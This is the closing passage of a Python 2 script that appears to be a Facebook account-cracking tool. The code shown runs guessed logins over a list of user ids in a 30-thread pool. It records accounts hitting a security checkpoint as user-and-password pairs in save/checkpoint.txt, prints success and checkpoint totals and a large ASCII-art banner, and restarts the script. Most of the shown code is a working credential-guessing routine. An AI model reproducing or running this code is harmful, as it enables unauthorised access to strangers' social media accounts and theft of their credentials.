            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[Checkpoint]\x1b[1;91m ' + k + c + user + ' \xe2\x9a\xa1\xe2\x9a\xa1 ' + pass1 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '\xe2\x9a\xa1\xe2\x9a\xa1' + pass1 + '\n')
                cps.close()
                checkpoint.append(c + user + pass1)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;96m\xe2\x98\x85\xef\xbe\x9f.\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x80\xa6\xe3\x83\xbb\xe2\x80\xa5\xe2\x98\x86*\xc2\xb4\xef\xbd\xa5\xef\xbc\x88AHMAD\xef\xbc\x89\xef\xbd\xa5\xef\xbd\x80*\xe2\x98\x86\xe3\x83\xbb\xe2\x80\xa5\xe2\x80\xa6\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xe2\x94\x81\xef\xbe\x9f.\xe2\x98\x85'
    print '[\xe2\x9c\x93] Process Has Been Completed ....'
    print '[\xe2\x9c\x93] Total OK/CP : ' + str(len(successfull)) + '/' + str(len(checkpoint))
    print '[\xe2\x9c\x93] CP File Has Been Saved : save/checkpoint.txt'
    print '\n\x1b[1;91m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;91m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;91m\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\n\x1b[1;91m\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\n\x1b[1;91m\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\n\x1b[1;91m\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\n\x1b[1;91m\xe2\x96\x88\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x96\x88\n\x1b[1;91m\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\n\x1b[1;91m\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\n\x1b[1;91m\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\n\x1b[1;91m\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\n\x1b[1;91m\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\n\x1b[1;91m\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\n\x1b[1;91m\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\n\x1b[1;91m\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\n\x1b[1;91m\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\n\x1b[1;91m\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\n\x1b[1;91m\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\n\x1b[1;91m\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\n\x1b[1;91m\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\n\x1b[1;91m\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\n\x1b[1;91m\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\n\x1b[1;91m\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x96\x93\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x93\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\n\x1b[1;91m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x96\x93\xe2\x96\x93\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x93\xe2\x96\x93\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;91m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x96\x93\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;91m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;91m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;91m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;91m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;91m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;91m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;91m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x95\xac\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\x1b[1;91m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\n\t'
    raw_input('\n[Press Enter To Go Back]')
    os.system('python2 af.py')


if __name__ == '__main__':
    menu()